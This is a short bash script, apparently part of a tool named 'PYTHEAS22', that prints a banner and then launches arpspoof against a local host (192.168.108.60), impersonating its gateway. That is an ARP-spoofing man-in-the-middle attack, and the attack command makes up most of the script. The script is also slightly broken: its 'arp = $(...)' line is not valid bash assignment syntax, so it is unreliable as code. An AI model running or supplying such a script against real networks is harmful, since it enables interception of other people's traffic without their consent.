#!/bin/bash
echo "THANK YOU FOR USING PYTHEAS22"
echo '"target.sh" WILL BE EXECUTED IN 2 SECONDS'
sleep 2
arp = $(arpspoof -i enp7s0 -t 192.168.108.60 192.168.108.254)